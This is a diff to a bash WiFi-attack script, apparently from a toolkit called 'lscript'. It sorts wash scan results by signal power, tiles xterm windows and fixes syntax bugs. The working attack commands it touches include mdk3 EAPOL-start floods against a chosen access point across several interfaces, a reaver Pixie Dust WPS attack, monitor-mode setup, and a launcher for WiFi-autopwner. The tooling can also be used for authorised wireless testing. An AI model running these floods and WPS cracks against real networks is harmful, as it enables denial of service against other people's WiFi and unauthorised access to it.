@@ -273,7 +273,7 @@ function scan_wash
 				sleep 2
 				continue
 			fi
-			WASHSCAN2="${nnum[$WASHSCAN]}"
+			WASHSCAN2="${SORTED[$WASHSCAN]}"
 			BSSIDT="${abssid[$WASHSCAN2]}"
 			CHANT="${achannel[$WASHSCAN2]}"
 			ESSIDT="${aessid[$WASHSCAN2]}"
@@ -373,6 +373,14 @@ do
 		break
 	elif [[ "$UNL" = "ch" || "$UNL" = "c" ]]
 	then
+		#~ xterm -T "Check if unlocked" -e 'wash -i $WLANNM | grep "$ESSIDT" | awk "{FS=" "} {print $5}" | tee /root/wa.txt'
+		#~ T1=$(wash -i $WLANNM | grep "$ESSIDT" | awk -F ' ' '{print $5}')
+		#~ if [[ "$T1" == "Yes" ]]
+		#~ then
+			#~ echo -e ""$RS"Still locked"$CE""
+		#~ else
+			#~ echo -e ""$YS"Unlocked!!!"$CE""
+		#~ fi
 		xterm -T "Check if unlocked" -e 'wash -i $WLANNM' & disown
 	elif [[ "$UNL" = "1" ]]
 	then
@@ -417,25 +425,27 @@ do
 		fi
 		export PPS
 		n=0
+		OFSET=-20
 		while true
 		do
+			OFSET=$((OFSET+20))
+			export OFSET
 			if [[ "$n" = 0 ]]
 			then
-				xterm -T "EAPOL start flood on $WLANNM" -hold -e 'mdk3 $WLANNM x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
-				#~ xterm -T "EAPOL start flood on $WLANNM" -hold -e 'mdk3 $WLANNM m -t $BSSIDT  && echo -e "" && echo -e "Close this window manually"' & disown
-				#~ xterm -T "EAPOL start flood on $WLANNM" -hold -e 'mdk3 $WLANNM b -t $BSSIDT && echo -e "" && echo -e "Close this window manually"' & disown
+				xterm -T "EAPOL start flood on $WLANNM" -geometry 80x11+0+"$OFSET" -hold -e 'mdk3 $WLANNM x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
 				n=$((n+1))
 				continue
 			else
 				if [[ "$n" != "$INTS" ]]
 				then
 					CURIN="${NI[$n]}"
+					export CURIN
 					if [[ "$CURIN" = "" ]]
 					then
 						echo -e ""$RS"Error 16. Interface not found."$CE""
 						sleep 3
 					else
-						xterm -T "EAPOL start flood on $CURIN" -hold -e 'mdk3 $CURIN x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
+						xterm -T "EAPOL start flood on $CURIN" -geometry 80x11+0+"$OFSET" -hold -e 'mdk3 $CURIN x 0 -t $BSSIDT -n "$ESSIDT" -s $PPS && echo -e "" && echo -e "Close this window manually"' & disown
 					fi
 				else
 					break
@@ -468,13 +478,6 @@ do
 						sleep 2
 						break
 					else
-						#~ n=1
-						#~ while [[ "$newints" != 0 ]]
-						#~ do
-							#~ NI[$n]=""
-							#~ n=$((n+1))
-							#~ newints=$((newints-1))
-						#~ done
 						INTS=1
 						break
 					fi
@@ -483,27 +486,43 @@ do
 			then
 				echo -e "New interface: "
 				read NII
-				TEST3=$((ifconfig | grep "$NII"))
+				TEST3=$(ifconfig | grep "$NII")
 				if [[ "$TEST3" = "" ]]
 				then
 					echo -e ""$RS"Could not find this interface on your system"$CE""
 					sleep 3
 				else
-					echo -e ""BS"Interface found!"$CE""
+					echo -e ""$BS"Interface found!"$CE""
 					sleep 2
 					clear
-					checkmonitor=$((iwconfig "$NII" | grep "Mode:Monitor"))
+					checkmonitor=$(iwconfig "$NII" | grep "Mode:Monitor")
 					if [[ "$checkmonitor" = "" ]]
 					then
 						echo -e ""$BS"Enabling monitor mode for "$NII"..."
 						airmon-ng start $NII | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE""
-						checkmonitor=$((iwconfig "$NII" | grep "Mode:Monitor"))
+						checkmonitor=$(iwconfig "$NII"mon | grep "Mode:Monitor")
 						if [[ "$checkmonitor" = "" ]]
 						then
 							echo -e ""$RS"Couldn't start monitor mode"$CE""
 							sleep 2
 							continue
 						fi
+					fi
+					z=1
+					l=0
+					while [[ "$z" -le "$INTS" ]]
+					do
+						if [[ "$NII" == "${NI[$z]}" || "$NII" == "$WLANNM" ]]
+						then
+							echo -e ""$RS"Interface already set"$CE""
+							sleep 2
+							l=1
+						fi
+						z=$((z+1))
+					done
+					if [[ "$l" = 1 ]]
+					then
+						continue
 					fi
 					NI[$INTS]="$NII"
 					INTS=$((INTS+1))
@@ -594,7 +613,7 @@ function pixie_attack
 	dash_calc
 	printf '\033]2;PIXIE DUST ATTACK\a'
 	#xterm -geometry 90x70+0+0 -e "aireplay-ng $WLANNM -1 10 -a $BSSIDT" & disown
-	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust=1 -vvv | tee /root/lscript/wpslog
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust -vvv | tee /root/lscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read
 }
@@ -614,60 +633,174 @@ function associate_aireplay
 	clear
 	exec bash "$0"
 }
+#~ function wash_awk
+#~ {
+#~ file="/root/lscript/tempwash"
+#~ linestotal=$(cat $file | awk 'END{print NR}')
+#~ lines=$((linestotal-7))
+#~ n=1
+#~ if [[ "$lines" != 0 ]]
+#~ then
+	#~ echo -e "    BSSID             CH ESSID"
+#~ fi
+#~ while [ $n -le "$lines" ]
+#~ do
+	#~ nnn=$((n+7))
+	#~ nnum[$n]=$nnn
+	#~ abssid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $1}')
+	#~ achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
+	#~ aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $7}')
+	#~ ti=7
+	#~ while true
+	#~ do
+		#~ essidtest=$(cat $file | awk -v nn="$nnn" -v po="$ti" '{if(NR==nn)print $po}')
+		#~ if [[ "$essidtest" != "" ]]
+		#~ then
+			#~ aessid[$nnn]="${aessid[$nnn]} $essidtest"
+		#~ else
+			#~ break
+		#~ fi
+		#~ ti=$((ti+1))
+	#~ done
+	#~ alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
+	#~ if [[ ! ${alock[$nnn]} = "No" ]]
+	#~ then
+		#~ locked="$RS"
+	#~ else
+		#~ locked="$YS"
+	#~ fi
+	#~ size=${#achannel[$nnn]}
+	#~ if [[ "$n" -le 9 ]]
+	#~ then
+		#~ if [[ "$size" = 2 ]]
+		#~ then
+			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
+		#~ else
+			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
+		#~ fi
+	#~ else
+		#~ if [[ "$size" = 2 ]]
+		#~ then
+			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
+		#~ else
+			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
+		#~ fi
+	#~ fi
+	#~ n=$(( n+1 ))
+#~ done
+#~ }
+
 function wash_awk
 {
 file="/root/lscript/tempwash"
 linestotal=$(cat $file | awk 'END{print NR}')
-lines=$((linestotal-7))
+lines=$((linestotal-2))
 n=1
 if [[ "$lines" != 0 ]]
 then
-	echo -e "    BSSID             CH ESSID"
+	echo -e "    BSSID             CH PR ESSID"
 fi
-while [ $n -le "$lines" ]
+while [[ "$n" -le "$lines" ]]
 do
-	nnn=$((n+7))
+	nnn=$((n+2))
 	nnum[$n]=$nnn
 	abssid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $1}')
 	achannel[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $2}')
-	aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $6}')
+	apower[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $3}' | cut -d '-' -f2)
+	tempn=${apower[$nnn]}
+	apower[$nnn]=$((100-tempn))
+	if [[ ${apower[$nnn]} -lt 10 ]]
+	then
+		apower[$nnn]="${apower[$nnn]} "
+	fi
+	aessid[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $7 " " $8 " " $9 " " $10 " " $11 " " $12}')
 	ti=7
-	while true
-	do
-		essidtest=$(cat $file | awk -v nn="$nnn" -v po="$ti" '{if(NR==nn)print $po}')
-		if [[ "$essidtest" != "" ]]
-		then
-			aessid[$nnn]="${aessid[$nnn]} $essidtest"
-		else
-			break
-		fi
-		ti=$((ti+1))
-	done
+	#~ while true
+	#~ do
+		#~ essidtest=$(cat $file | awk -v nn="$nnn" -v po="$ti" '{if(NR==nn)print $po}')
+		#~ echo "Total = $essidtest"
+		#~ if [[ "$essidtest" != "" ]]
+		#~ then
+			#~ aessid[$nnn]="${aessid[$nnn]} $essidtest"
+		#~ else
+			#~ break
+		#~ fi
+		#~ ti=$((ti+1))
+	#~ done
 	alock[$nnn]=$(cat $file | awk -v nn="$nnn" '{if(NR==nn)print $5}')
-	if [[ ! ${alock[$nnn]} = "No" ]]
+	n=$(( n+1 ))
+done
+##sorting them according to the power:
+n=1
+while [[ "$n" -le "$lines" ]]
+do
+	#~ nnn=$((n+2))
+	#~ size=${#achannel[$nnn]}
+	#~ if [[ ! ${alock[$nnn]} = "No" ]]
+	#~ then
+		#~ locked="$RS"
+	#~ else
+		#~ locked="$YS"
+	#~ fi
+	#~ if [[ "$n" -le 9 ]]
+	#~ then
+		#~ if [[ "$size" = 2 ]]
+		#~ then
+			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
+		#~ else
+			#~ echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
+		#~ fi
+	#~ else
+		#~ if [[ "$size" = 2 ]]
+		#~ then
+			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
+		#~ else
+			#~ echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${apower[$nnn]} ${aessid[$nnn]}"$CE""
+		#~ fi
+	#~ fi
+	n2=1
+	VALUE=0
+	while [[ "$n2" -le "$lines" ]]
+	do
+		if [[ "${apower[${nnum[$n2]}]}" -ge "$VALUE" ]]
+		then
+			VALUE=${apower[${nnum[$n2]}]}
+			NUM=${nnum[$n2]}
+		fi
+		n2=$((n2+1))	
+	done
+	SORTED[$n]=$NUM
+	SORTEDPR[$n]=$VALUE
+	apower[$NUM]="-1"
+	n=$((n+1))
+done
+n=1
+while [[ "$n" -le "$lines" ]]
+do
+	#size=${#achannel[${nnum[$n]}]}
+	if [[ ! ${alock[${nnum[$n]}]} = "No" ]]
 	then
 		locked="$RS"
 	else
 		locked="$YS"
 	fi
-	size=${#achannel[$nnn]}
 	if [[ "$n" -le 9 ]]
 	then
-		if [[ "$size" = 2 ]]
+		if [[ ${achannel[${SORTED[$n]}]} -lt 10 ]]
 		then
-			echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
+			echo -e " "$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]}  ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
 		else
-			echo -e " "$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
+			echo -e " "$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]} ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
 		fi
 	else
-		if [[ "$size" = 2 ]]
+		if [[ ${achannel[${SORTED[$n]}]} -lt 10 ]]
 		then
-			echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]} ${aessid[$nnn]}"$CE""
+			echo -e ""$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]}  ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
 		else
-			echo -e ""$locked""$n""$CE") "$locked"${abssid[$nnn]} ${achannel[$nnn]}  ${aessid[$nnn]}"$CE""
+			echo -e ""$locked""$n""$CE") "$locked"${abssid[${SORTED[$n]}]} ${achannel[${SORTED[$n]}]} ${SORTEDPR[$n]} ${aessid[${SORTED[$n]}]}"$CE""
 		fi
 	fi
-	n=$(( n+1 ))
+	n=$((n+1))
 done
 }
 function bully_script
@@ -996,7 +1129,7 @@ then
 	fi
 elif [[ "$YN" = "8" ]]
 then
-	if [[ -f /root/WiFi-autopwner/wifi-autopwner.s ]]
+	if [[ -f /root/WiFi-autopwner/wifi-autopwner.sh ]]
 	then
 		cd /root/WiFi-autopwner
 		./wifi-autopwner.sh
